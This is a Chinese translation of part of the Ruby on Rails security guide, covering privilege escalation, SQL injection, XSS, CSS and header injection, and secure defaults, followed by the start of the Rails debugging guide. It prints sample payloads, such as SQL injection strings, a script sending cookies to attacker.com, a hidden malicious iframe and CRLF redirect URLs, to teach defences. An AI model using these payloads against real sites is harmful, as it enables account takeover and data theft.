因为这种问题经常出现，如果使用的正则表达式以 ^ 开头，或者以 $ 结尾，格式验证器（validates_format_of）会抛出异常。如果确实需要使用 ^ 和 $（但很少见），可以把 :multiline 选项设为 true，如下所示：
# content should include a line "Meanwhile" anywhere in the string
validates :content, format: { with: /^Meanwhile$/, multiline: true }

注意，这种方式只能避免格式验证中出现的常见错误。你要牢记，在 Ruby 中 ^ 和 $ 分别匹配行的开头和结尾，不是整个字符串的开头和结尾。
###  6.7 权限提升

只需修改一个参数就可能赋予用户未授权的权限。记住，不管你怎么隐藏参数，还是可能被修改。

用户最可能篡改的参数是 ID，例如在 http://www.domain.com/project/1 中，ID 为 1，这个参数的值在控制器中可通过 params 获取。在控制器中可能会做如下的查询：
@project = Project.find(params[:id])

在某些程序中这么做没问题，但如果用户没权限查看所有项目就不能这么做。如果用户把 ID 改为 42，但其实无权查看这个项目的信息，用户还是能够看到。我们应该同时查询用户的访问权限：
@project = @current_user.projects.find(params[:id])

不同的程序用户可篡改的参数也不同，谨记一个原则，用户输入的数据未经验证之前都是不安全的，传入的每个参数都有潜在危险。

别傻了，隐藏参数或者使用 JavaScript 根本就无安全性可言。使用 Firefox 的开发者工具可以修改表单中的每个隐藏字段。JavaScript 只能验证用户的输入数据，但不能避免攻击者发送恶意请求。Firefox 的 Live Http Headers 插件可以记录每次请求，而且能重复请求或者修改请求内容，很容易就能跳过 JavaScript 验证。有些客户端代理还能拦截任意请求和响应。
##  7 注入

注入这种攻击方式可以把恶意代码或参数写入程序，在程序所谓安全的环境中执行。常见的注入方式有跨站脚本和 SQL 注入。

注入具有一定技巧性，一段代码或参数在一个场合是恶意的，但换个场合可能就完全无害。这里所说的“场合”可以是一个脚本，查询，编程语言，shell 或者 Ruby/Rails 方法。下面各节分别介绍注入攻击可能发生的场合。不过，首先我们要说明和注入有关的架构决策。
###  7.1 白名单与黑名单

过滤、保护或者验证时白名单比黑名单好。

黑名单可以是一组不可用的 Email 地址，非公开的动作或者不能使用的 HTML 标签。白名单则相反，是一组可用的 Email 地址，公开的动作和可用的 HTML 标签。某些情况下无法创建白名单（例如，垃圾信息过滤），但下列场合推荐使用白名单：

    before_action 的选项使用 only: [...]，而不是 except: [...]。这样做，新建的动作就不会误入 before_action。
    防范跨站脚本时推荐加上 <strong> 标签，不要删除 <script> 元素。详情参见后文。
    不要尝试使用黑名单修正用户的输入
        这么做会成全这种攻击："<sc<script>ript>".gsub("<script>", "")
        直接拒绝即可

使用白名单还能避免忘记黑名单中的内容。
###  7.2 SQL 注入

Rails 中的方法足够智能，能避免 SQL 注入。但 SQL 注入是网页程序中比较常见且危险性高的攻击方式，因此有必要了解一下。
####  7.2.1 简介

SQL 注入通过修改传入程序的参数，影响数据库查询。常见目的是跳过授权管理系统，处理数据或读取任意数据。下面举例说明为什么要避免在查询中使用用户输入的数据。
Project.where("name = '#{params[:name]}'")

这个查询可能出现在搜索动作中，用户输入想查找的项目名。如果恶意用户输入 ' OR 1 --，得到的 SQL 查询为：
SELECT * FROM projects WHERE name = '' OR 1 --'

两根横线表明注释开始，后面所有的语句都会被忽略。所以上述查询会读取 projects 表中所有记录，包括向用户隐藏的记录。这是因为所有记录都满足查询条件。
####  7.2.2 跳过授权

网页程序中一般都有访问控制功能。用户输入登录密令后，网页程序试着在用户数据表中找到匹配的记录。如果找到了记录就赋予用户相应的访问权限。不过，攻击者可通过 SQL 注入跳过这种检查。下面显示了 Rails 中一个常见的数据库查询，在用户表中查询匹配用户输入密令的第一个记录。
User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")

如果用户输入的 name 参数值为 ' OR '1'='1，password 参数的值为 ' OR '2'>'1，得到的 SQL 查询为：
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1

这个查询直接在数据库中查找第一个记录，然后赋予其相应的权限。
####  7.2.3 未经授权读取数据

UNION 语句连接两个 SQL 查询，返回的结果只有一个集合。攻击者利用 UNION 语句可以从数据库中读取任意数据。下面来看个例子：
Project.where("name = '#{params[:name]}'")

注入一个使用 UNION 语句的查询：
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --

得到的 SQL 查询如下：
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'

上述查询的结果不是一个项目集合（因为找不到没有名字的项目），而是一组由用户名和密码组成的集合。真希望你加密了存储在数据库中的密码！攻击者要为两个查询语句提供相同的字段数量。所以在第二个查询中有很多 1。攻击者可以总是使用 1，只要字段的数量和第一个查询一样即可。

而且，第二个查询使用 AS 语句重命名了某些字段，这样程序就能显示出从用户表中查询得到的数据。
####  7.2.4 对策

Rails 内建了能过滤 SQL 中特殊字符的过滤器，会转义 '、"、NULL 和换行符。Model.find(id) 和 Model.find_by_something(something) 会自动使用这个过滤器。但在 SQL 片段中，尤其是条件语句（where("...")），connection.execute() 和 Model.find_by_sql() 方法，需要手动调用过滤器。

请不要直接传入条件语句，而要传入一个数组，进行过滤。如下所示：
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first

如上所示，数组的第一个元素是包含问号的 SQL 片段，要过滤的内容是数组其后的元素，过滤后的值会替换第一个元素中的问号。传入 Hash 的作用相同：
Model.where(login: entered_user_name, password: entered_password).first

数组或 Hash 形式只能在模型实例上使用。其他地方可使用 sanitize_sql() 方法。在 SQL 中使用外部字符串时要时刻警惕安全性。
###  7.3 跨站脚本

网页程序中影响范围最广、危害性最大的安全漏洞是跨站脚本。这种恶意攻击方式在客户端注入可执行的代码。Rails 提供了防御这种攻击的帮助方法。
####  7.3.1 切入点

切入点是攻击者可用来发起攻击的漏洞 URL 地址和其参数。

常见的切入点有文章、用户评论、留言本，项目的标题、文档的名字和搜索结果页面也经常受到攻击，只要用户能输入数据的地方都有危险。输入的数据不一定来自网页中的输入框，也可以来自任何 URL 参数（公开参数，隐藏参数或者内部参数）。记住，用户能拦截任何通信。Firefox 的 Live HTTP Headers 插件，以及客户端代码能轻易的修改请求数据。

跨站脚本攻击的工作方式是这样的：攻击者注入一些代码，程序将其保存并在页面中显示出来。大多数跨站脚本只显示一个弹窗，但危险性极大。跨站脚本可以窃取 cookie，劫持会话，把用户引向虚假网站，显示广告让攻击者获利，修改网页中的元素获取机密信息，或者通过浏览器的安全漏洞安装恶意软件。

2007 年下半年，Mozilla 浏览器发现了 88 个漏洞，Safari 发现了 22 个漏洞，IE 发现了 18 个漏洞，Opera 发现了 12 个漏洞。赛门铁克全球互联网安全威胁报告指出，2007 年下半年共发现了 238 个浏览器插件导致的漏洞。对黑客来说，网页程序框架爆出的 SQL 注入漏洞很具吸引力，他们可以利用这些漏洞在数据表中的每个文本字段中插入恶意代码。2008 年 4 月，有 510000 个网站被这种方法攻破，其中英国政府和美国政府的网站是最大的目标。

一个相对较新、不常见的切入点是横幅广告。Trend Micro 的文章指出，2008 年早些时候在流行的网站（例如 MySpace 和 Excite）中发现了横幅广告中包含恶意代码。
####  7.3.2 HTML/JavaScript 注入

跨站脚本最常用的语言当然是使用最广泛的客户端脚本语言 JavaScript，而且经常掺有 HTML。转义用户的输入是最基本的要求。

下面是一段最直接的跨站脚本：
<script>alert('Hello');</script>

上面的 JavaScript 只是显示一个提示框。下面的例子作用相同，但放在不太平常的地方：
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
#####  7.3.2.1 盗取 cookie

上面的例子没什么危害，下面来看一下攻击者如何盗取用户 cookie（因此也能劫持会话）。在 JavaScript 中，可以使用 document.cookie 读写 cookie。JavaScript 强制使用同源原则，即一个域中的脚本无法访问另一个域中的 cookie。document.cookie 属性中保存的 cookie 来自源服务器。不过，如果直接把代码放在 HTML 文档中（就跟跨站脚本一样），就可以读写这个属性。把下面的代码放在程序的任何地方，看一下页面中显示的 cookie 值：
<script>document.write(document.cookie);</script>

对攻击者来说，这么做没什么用，因为用户看到了自己的 cookie。下面这个例子会从 http://www.attacker.com/ 加载一个图片和 cookie。当然，这个地址并不存在，因此浏览器什么也不会显示。但攻击者可以查看服务器的访问日志获取用户的 cookie。
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>

www.attacker.com 服务器上的日志文件中可能有这么一行记录：
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2

在 cookie 中加上 httpOnly 标签可以避免这种攻击，加上 httpOnly 后，JavaScript 就无法读取 document.cookie 属性的值。IE v6.SP1、Firefox v2.0.0.5 和 Opera 9.5 都支持只能使用 HTTP 请求访问的 cookie，Safari 还在考虑这个功能，暂时会忽略这个选项。但在其他浏览器，或者旧版本的浏览器（例如 WebTV 和 Mac 系统中的 IE 5.5）中无法加载页面。有一点要注意，使用 Ajax 仍可读取 cookie。
#####  7.3.2.2 涂改

攻击者可通过网页涂改做很多事情，例如，显示错误信息，或者引导用户到攻击者的网站，偷取登录密码或者其他敏感信息。最常见的涂改方法是使用 iframe 加载外部代码：
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>

iframe 可以从其他网站加载任何 HTML 和 JavaScript。上述 iframe 是使用 Mpack 框架攻击意大利网站的真实代码。Mpack 尝试通过浏览器的安全漏洞安装恶意软件，成功率很高，有 50% 的攻击成功了。

更特殊的攻击是完全覆盖整个网站，或者显示一个登陆框，看去来和原网站一模一样，但把用户名和密码传给攻击者的网站。还可使用 CSS 或 JavaScript 把网站中原来的链接隐藏，换上另一个链接，把用户带到仿冒网站上。

还有一种攻击方式不保存信息，把恶意代码包含在 URL 中。如果搜索表单不过滤搜索关键词，这种攻击就更容易实现。下面这个链接显示的页面中包含这句话“乔治•布什任命 9 岁男孩为主席...”：
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
#####  7.3.2.3 对策

过滤恶意输入很重要，转义输出也同样重要。

对跨站脚本来说，过滤输入值一定要使用白名单而不是黑名单。白名单指定允许输入的值。黑名单则指定不允许输入的值，无法涵盖所有禁止的值。

假设黑名单从用户的输入值中删除了 script，但如果攻击者输入 <scrscriptipt>，过滤后剩余的值是 <script>。在以前版本的 Rails 中，strip_tags()、strip_links() 和 sanitize() 方法使用黑名单。所以下面这种注入完全可行：
strip_tags("some<<b>script>alert('hello')<</b>/script>")

上述方法的返回值是 some<script>alert('hello')</script>，仍然可以发起攻击。所以我才支持使用白名单，使用 Rails 2 中升级后的 sanitize() 方法：
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))

这个方法只允许使用指定的标签，效果很好，能对付各种诡计和改装的标签。

而后，还要转义程序的所有输出，尤其是要转义输入时没有过滤的用户输入值（例如前面举过的搜索表单例子）。使用 escapeHTML() 方法（或者别名 h()）把 HTML 中的 &、"、< 和> 字符替换成 &amp;、&quot;、&lt; 和 &gt;。不过开发者很容易忘记这么做，所以推荐使用 SafeErb 插件，SafeErb 会提醒你转义外部字符串。
#####  7.3.2.4 编码注入

网络流量大都使用有限的西文字母传输，所以后来出现了新的字符编码方式传输其他语种的字符。这也为网页程序带来了新的威胁，因为恶意代码可以隐藏在不同的编码字符中，浏览器可以处理这些编码，但网页程序不一定能处理。下面是使用 UTF-8 编码攻击的例子：
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

上面的代码会弹出一个提示框。sanitize() 方法可以识别这种代码。编码字符串的一个好用工具是 Hackvertor，使用这个工具可以做到知己知彼。Rails 的 sanitize() 方法能有效避免编码攻击。
####  7.3.3 真实案例

要想理解现今对网页程序的攻击方式，最好看几个真实案例。

下面的代码摘自针对 Yahoo! 邮件的蠕虫病毒，由 Js.Yamanner@m 制作，发生在 2006 年 6 月 11 日，是第一个针对网页邮件客户端的蠕虫病毒：
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...

这个蠕虫病毒利用 Yahoo 的 HTML/JavaScript 过滤器漏洞。这个过滤器过滤标签中所有的 target 和 onload 属性，因为这两个属性的值可以是 JavaScript 代码。这个过滤器只会执行一次，所以包含蠕虫病毒代码的 onload 属性不会被过滤掉。这个例子很好的说明了黑名单很难以偏概全，也说明了在网页程序中为什么很难提供输入 HTML/JavaScript 的支持。

还有一个概念性的蠕虫是 Nduja，这个蠕虫可以跨域攻击四个意大利网页邮件服务。详情参见 Rosario Valotta 的论文。以上两种邮件蠕虫的目的都是获取 Email 地址，黑客可从中获利。

2006 年 12 月，一次 MySpace 钓鱼攻击泄露了 34000 个真实地用户名和密码。这次攻击的方式是创建一个名为“login_home_index_html”的资料页，URL 地址看起来很正常，但使用了精心制作的 HTML 和 CSS 隐藏真实的由 MySpace 生成的内容，显示了一个登录表单。

MySpace Samy 蠕虫在“CSS 注入”一节说明。
###  7.4 CSS 注入

CSS 注入其实就是 JavaScript 注入，因为有些浏览器（IE，某些版本的 Safari 等）允许在 CSS 中使用 JavaScript。允许在程序中使用自定义的 CSS 时一定要三思。

CSS 注入的原理可以通过有名的 MySpace Samy 蠕虫说明。访问 Samy（攻击者）的 MySpace 资料页时会自动向 Samy 发出好友请求。几小时之内 Samy 就收到了超过一百万个好友请求，消耗了 MySpace 大量流量，导致网站瘫痪。下面从技术层面分析这个蠕虫。

MySpace 禁止使用很多标签，但却允许使用 CSS。所以，蠕虫的作者按照下面的方式在 CSS 中加入了 JavaScript 代码：
<div style="background:url('javascript:alert(1)')">

因此问题的关键是 style 属性，但属性的值中不能含有引号，因为单引号和双引号都已经使用了。但是 JavaScript 中有个很实用的 eval() 函数，可以执行任意字符串：
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">

eval() 函数对黑名单过滤来说是个噩梦，可以把 innerHTML 隐藏在 style 属性中：
alert(eval('document.body.inne' + 'rHTML'));

MySpace 会过滤 javascript 这个词，所以蠕虫作者使用 java<NEWLINE>script 绕过了这个限制：
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">

蠕虫作者面对的另一个问题是 CSRF 安全权标。没有安全权标就无法通过 POST 请求发送好友请求。蠕虫作者先向页面发起 GET 请求，然后再添加用户，处理 CSRF 权标。

最终，只用 4KB 空间就写好了这个蠕虫，注入到自己的资料页面。

CSS 中的 moz-binding 属性也被证实可在基于 Gecko 的浏览器（例如 Firefox）中把 Javascript 写入 CSS 中。
####  7.4.1 对策

这个例子再次证明黑名单不能以偏概全。自定义 CSS 在网页程序中是个很少见的功能，因此我也不知道怎么编写 CSS 白名单过滤器。如果想让用户自定义颜色或图片，可以让用户选择颜色或图片，再由网页程序生成 CSS。如果真的需要 CSS 白名单过滤器，可以使用 Rails 的 sanitize() 方法。
###  7.5 Textile 注入

如果想提供 HTML 之外的文本格式化方式（基于安全考虑），可以使用能转换为 HTML 的标记语言。RedCloth 就是一种使用 Ruby 编写的转换工具。使用前要注意，RedCloth 也有跨站脚本漏洞。

例如，RedCloth 会把 _test_ 转换成 <em>test</em>，斜体显示文字。不过到最新的 3.0.4 版本，仍然有跨站脚本漏洞。请安装已经解决安全问题的全新第 4 版。可是这个版本还有一些安全隐患。下面的例子针对 V3.0.4：
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"

使用 :filter_html 选项可以过滤不是由 RedCloth 生成的 HTML：
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"

不过，这个选项不能过滤全部的 HTML，会留下一些标签（程序就是这样设计的），例如 <a>：
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
####  7.5.1 对策

建议使用 RedCloth 时要同时使用白名单过滤输入值，这一点在应对跨站脚本攻击时已经说过。
###  7.6 Ajax 注入

在常规动作上运用的安全预防措施在 Ajax 动作上也要使用。不过有一个例外：如果动作不渲染视图，在控制器中就要做好转义。

如果使用 in_place_editor 插件，或者动作不渲染视图只返回字符串，就要在动作中转义返回值。否则，如果返回值中包含跨站脚本，发送到浏览器时就会执行。请使用 h() 方法转义所有输入值。
###  7.7 命令行注入

使用用户输入的命令行参数时要小心。

如果程序要在操作系统层面执行命令，可以使用 Ruby 提供的几个方法：exec(command)，syscall(command)，system(command) 和 command。如果用户可以输入整个命令，或者命令的一部分，这时就要特别注意。因为在大多数 shell 中，两个命令可以写在一起，使用分号（;）或者竖线（|）连接。

为了避免这类问题，可以使用 system(command, parameters) 方法，这样传入的命令行参数更安全。
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
###  7.8 报头注入

HTTP 报头是动态生成的，某些情况下可能会包含用户注入的值，导致恶意重定向、跨站脚本或者 HTTP 响应拆分（HTTP response splitting）。

HTTP 请求报头中包含 Referer，User-Agent（客户端软件）和 Cookie 等字段。响应报头中包含状态码，Cookie 和 Location（重定向的目标 URL）等字段。这些字段都由用户提供，可以轻易修改。记住，报头也要转义。例如，在管理页面中显示 User-Agent 时。

除此之外，基于用户输入值构建响应报头时还要格外小心。例如，把用户重定向到指定的页面。重定向时需要在表单中加入 referer 字段：
redirect_to params[:referer]

Rails 会把这个字段的值提供给 Location 报头，并向浏览器发送 302（重定向）状态码。恶意用户可以做的第一件事是：
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld

Rails 2.1.2 之前有个漏洞，黑客可以注入任意的报头字段，例如：
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld

注意，%0d%0a 是编码后的 \r\n，在 Ruby 中表示回车换行（CRLF）。上面的例子得到的 HTTP 报头如下所示，第二个 Location 覆盖了第一个：
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld

报头注入就是在报头中注入 CRLF 字符。那么攻击者是怎么进行恶意重定向的呢？攻击者可以把用户重定向到钓鱼网站，要求再次登录，把登录密令发送给攻击者。或者可以利用浏览器的安全漏洞在网站中安装恶意软件。Rails 2.1.2 在 redirect_to 方法中转义了传给 Location 报头的值。使用用户的输入值构建报头时要手动进行转义。
####  7.8.1 响应拆分

既然报头注入有可能发生，响应拆分也有可能发生。在 HTTP 响应中，报头后面跟着两个 CRLF，然后是真正的数据（HTML）。响应拆分的原理是在报头中插入两个 CRLF，后跟其他的响应，包含恶意 HTML。响应拆分示例：
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html
 
 
HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html
 
 
&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html

某些情况下，拆分后的响应会把恶意 HTML 显示给用户。不过这只会在 Keep-Alive 连接中发生，大多数浏览器都使用一次性连接。但你不能依赖这一点。不管怎样这都是个严重的隐患，你需要升级到 Rails 最新版，消除报头注入风险（因此也就避免了响应拆分）。
##  8 生成的不安全查询

根据 Active Record 处理参数的方式以及 Rack 解析请求参数的方式，攻击者可以通过 WHERE IS NULL 子句发起异常数据库查询。为了应对这种安全隐患（CVE-2012-2660，CVE-2012-2694 和 CVE-2013-0155），Rails 加入了 deep_munge 方法，增加安全性。

如果不使用 deep_munge 方法，下面的代码有被攻击的风险：
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end

如果 params[:token] 的值是 []、[nil]、[nil, nil, ...] 或 ['foo', nil] 之一，会跳过 nil? 检查，但 WHERE 子句 IS NULL 或 IN ('foo', NULL) 还是会添加到 SQL 查询中。

为了保证 Rails 的安全性，deep_munge 方法会把某些值替换成 nil。下表显示在请求中发送 JSON 格式数据时得到的参数：
JSON 	参数
{ "person": null } 	{ :person => nil }
{ "person": [] } 	{ :person => nil }
{ "person": [null] } 	{ :person => nil }
{ "person": [null, null, ...] } 	{ :person => nil }
{ "person": ["foo", null] } 	{ :person => ["foo"] }

如果知道这种风险，也知道如何处理，可以通过设置禁用 deep_munge，使用原来的处理方式：
config.action_dispatch.perform_deep_munge = false
##  9 默认报头

Rails 程序返回的每个 HTTP 响应都包含下面这些默认的安全报头：
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '1; mode=block',
  'X-Content-Type-Options' => 'nosniff'
}

默认的报头可在文件 config/application.rb 中设置：
config.action_dispatch.default_headers = {
  'Header-Name' => 'Header-Value',
  'X-Frame-Options' => 'DENY'
}

当然也可删除默认报头：
config.action_dispatch.default_headers.clear

下面是一些常用的报头：

    X-Frame-Options：Rails 中的默认值是 SAMEORIGIN，允许使用同域中的 iframe。设为 DENY 可以完全禁止使用 iframe。如果允许使用所有网站的 iframe，可以设为 ALLOWALL。
    X-XSS-Protection：Rails 中的默认值是 1; mode=block，使用跨站脚本审查程序，如果发现跨站脚本攻击就不显示网页。如果想关闭跨站脚本审查程序，可以设为 0;（如果响应中包含请求参数中传入的脚本）。
    X-Content-Type-Options：Rails 中的默认值是 nosniff，禁止浏览器猜测文件的 MIME 类型。
    X-Content-Security-Policy：一种强大的机制，控制可以从哪些网站加载特定类型的内容。
    Access-Control-Allow-Origin：设置哪些网站可以不沿用同源原则，发送跨域请求。
    Strict-Transport-Security：设置是否强制浏览器使用安全连接访问网站。

##  10 环境相关的安全问题

增加程序代码和环境安全性的话题已经超出了本文范围。但记住要保护好数据库设置（config/database.yml）以及服务器端密令（config/secrets.yml）。更进一步，为了安全，这两个文件以及其他包含敏感数据的文件还可使用环境专用版本。
##  11 其他资源

安全漏洞层出不穷，所以一定要了解最新信息，新的安全漏洞可能会导致灾难性的后果。安全相关的信息可从下面的网站获取：

    Ruby on Rails 安全项目，经常会发布安全相关的新闻：http://www.rorsecurity.info；
    订阅 Rails 安全邮件列表；
    时刻关注程序所用组件的安全问题（还有周报）；
    优秀的安全博客，包含一个跨站脚本速查表；

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  调试 Rails 程序

本文介绍如何调试 Rails 程序。

读完本文，你将学到：

    调试的目的；
    如何追查测试没有发现的问题；
    不同的调试方法；
    如何分析调用堆栈；

Chapters

    调试相关的视图帮助方法
        debug
        to_yaml
        inspect
    Logger
        Logger 是什么
        日志等级
        写日志
        日志标签
        日志对性能的影响
    使用 debugger gem 调试
        安装
        Shell
        上下文
        线程
        审查变量
        逐步执行
        断点
        捕获异常
        恢复执行
        编辑
        退出
        设置
    调试内存泄露
        Valgrind
    用于调试的插件
    参考资源

##  1 调试相关的视图帮助方法

调试一个常见的需求是查看变量的值。在 Rails 中，可以使用下面这三个方法：

    debug
    to_yaml
    inspect

###  1.1 debug

debug 方法使用 YAML 格式渲染对象，把结果包含在 <pre> 标签中，可以把任何对象转换成人类可读的数据格式。例如，在视图中有以下代码：
<%= debug @post %>
<p>
  <b>Title:</b>
  <%= @post.title %>
</p>

渲染后会看到如下结果：
--- !ruby/object:Post
attributes:
  updated_at: 2008-09-05 22:55:47
  body: It's a very helpful guide for debugging your Rails app.
  title: Rails debugging guide
  published: t
  id: "1"
  created_at: 2008-09-05 22:55:47
attributes_cache: {}
 
 
Title: Rails debugging guide
###  1.2 to_yaml

使用 YAML 格式显示实例变量、对象的值或者方法的返回值，可以这么做：
<%= simple_format @post.to_yaml %>
<p>
  <b>Title:</b>
  <%= @post.title %>
</p>

to_yaml 方法把对象转换成可读性较好地 YAML 格式，simple_format 方法按照终端中的方式渲染每一行。debug 方法就是包装了这两个步骤。

上述代码在渲染后的页面中会显示如下内容：
--- !ruby/object:Post
attributes:
updated_at: 2008-09-05 22:55:47
body: It's a very helpful guide for debugging your Rails app.
title: Rails debugging guide
published: t
id: "1"
created_at: 2008-09-05 22:55:47
attributes_cache: {}
 
Title: Rails debugging guide
###  1.3 inspect

另一个用于显示对象值的方法是 inspect，显示数组和 Hash 时使用这个方法特别方便。inspect 方法以字符串的形式显示对象的值。例如：
<%= [1, 2, 3, 4, 5].inspect %>
<p>
  <b>Title:</b>
  <%= @post.title %>
</p>

渲染后得到的结果如下：
[1, 2, 3, 4, 5]
 
Title: Rails debugging guide
##  2 Logger

运行时把信息写入日志文件也很有用。Rails 分别为各运行环境都维护着单独的日志文件。
###  2.1 Logger 是什么

Rails 使用 ActiveSupport::Logger 类把信息写入日志。当然也可换用其他代码库，比如 Log4r。

替换日志代码库可以在 environment.rb 或其他环境文件中设置：
Rails.logger = Logger.new(STDOUT)
Rails.logger = Log4r::Logger.new("Application Log")

默认情况下，日志文件都保存在 Rails.root/log/ 文件夹中，日志文件名为 environment_name.log。
###  2.2 日志等级

如果消息的日志等级等于或高于设定的等级，就会写入对应的日志文件中。如果想知道当前的日志等级，可以调用 Rails.logger.level 方法。

可用的日志等级包括：:debug，:info，:warn，:error，:fatal 和 :unknown，分别对应数字 0-5。修改默认日志等级的方式如下：
config.log_level = :warn # In any environment initializer, or
Rails.logger.level = 0 # at any time

这么设置在开发环境和交付准备环境中很有用，在生产环境中则不会写入大量不必要的信息。

Rails 为生产环境设置的默认日志等级是 info，生产环境和测试环境的默认日志等级是 debug。
###  2.3 写日志

把消息写入日志文件可以在控制器、模型或邮件发送程序中调用 logger.(debug|info|warn|error|fatal) 方法。
logger.debug "Person attributes hash: #{@person.attributes.inspect}"
logger.info "Processing the request..."
logger.fatal "Terminating application, raised unrecoverable error!!!"

下面这个例子增加了额外的写日志功能：
class PostsController < ApplicationController
  # ...
 
  def create
    @post = Post.new(params[:post])
    logger.debug "New post: #{@post.attributes.inspect}"
    logger.debug "Post should be valid: #{@post.valid?}"
 
    if @post.save
      flash[:notice] = 'Post was successfully created.'
      logger.debug "The post was saved and now the user is going to be redirected..."
      redirect_to(@post)
    else
      render action: "new"
    end
  end
 
  # ...
end

执行上述动作后得到的日志如下：
Processing PostsController#create (for 127.0.0.1 at 2008-09-08 11:52:54) [POST]
  Session ID: BAh7BzoMY3NyZl9pZCIlMDY5MWU1M2I1ZDRjODBlMzkyMWI1OTg2NWQyNzViZjYiCmZsYXNoSUM6J0FjdGl
vbkNvbnRyb2xsZXI6OkZsYXNoOjpGbGFzaEhhc2h7AAY6CkB1c2VkewA=--b18cd92fba90eacf8137e5f6b3b06c4d724596a4
  Parameters: {"commit"=>"Create", "post"=>{"title"=>"Debugging Rails",
 "body"=>"I'm learning how to print in logs!!!", "published"=>"0"},
 "authenticity_token"=>"2059c1286e93402e389127b1153204e0d1e275dd", "action"=>"create", "controller"=>"posts"}
New post: {"updated_at"=>nil, "title"=>"Debugging Rails", "body"=>"I'm learning how to print in logs!!!",
 "published"=>false, "created_at"=>nil}
Post should be valid: true
  Post Create (0.000443)   INSERT INTO "posts" ("updated_at", "title", "body", "published",
 "created_at") VALUES('2008-09-08 14:52:54', 'Debugging Rails',
 'I''m learning how to print in logs!!!', 'f', '2008-09-08 14:52:54')
The post was saved and now the user is going to be redirected...
Redirected to #<Post:0x20af760>
Completed in 0.01224 (81 reqs/sec) | DB: 0.00044 (3%) | 302 Found [http://localhost/posts]

加入这种日志信息有助于发现异常现象。如果添加了额外的日志消息，记得要合理设定日志等级，免得把大量无用的消息写入生产环境的日志文件。
###  2.4 日志标签

运行多用户/多账户的程序时，使用自定义的规则筛选日志信息能节省很多时间。Active Support 中的 TaggedLogging 模块可以实现这种功能，可以在日志消息中加入二级域名、请求 ID 等有助于调试的信息。
logger = ActiveSupport::TaggedLogging.new(Logger.new(STDOUT))
logger.tagged("BCX") { logger.info "Stuff" }                            # Logs "[BCX] Stuff"
logger.tagged("BCX", "Jason") { logger.info "Stuff" }                   # Logs "[BCX] [Jason] Stuff"
logger.tagged("BCX") { logger.tagged("Jason") { logger.info "Stuff" } } # Logs "[BCX] [Jason] Stuff"
###  2.5 日志对性能的影响

如果把日志写入硬盘，肯定会对程序有点小的性能影响。不过可以做些小调整：:debug 等级比 :fatal 等级对性能的影响更大，因为写入的日志消息量更多。

如果按照下面的方式大量调用 Logger，也有潜在的问题：
logger.debug "Person attributes hash: #{@person.attributes.inspect}"

在上述代码中，即使日志等级不包含 :debug 也会对性能产生影响。因为 Ruby 要初始化字符串，再花时间做插值。因此推荐把代码块传给 logger 方法，只有等于或大于设定的日志等级时才会执行其中的代码。重写后的代码如下：
logger.debug {"Person attributes hash: #{@person.attributes.inspect}"}

代码块中的内容，即字符串插值，仅当允许 :debug 日志等级时才会执行。这种降低性能的方式只有在日志量比较大时才能体现出来，但却是个好的编程习惯。
##  3 使用 debugger gem 调试

如果代码表现异常，可以在日志文件或者控制台查找原因。但有时使用这种方法效率不高，无法找到导致问题的根源。如果需要检查源码，debugger gem 可以助你一臂之力。

如果想学习 Rails 源码但却无从下手，也可使用 debugger gem。随便找个请求，然后按照这里介绍的方法，从你编写的代码一直研究到 Rails 框架的代码。
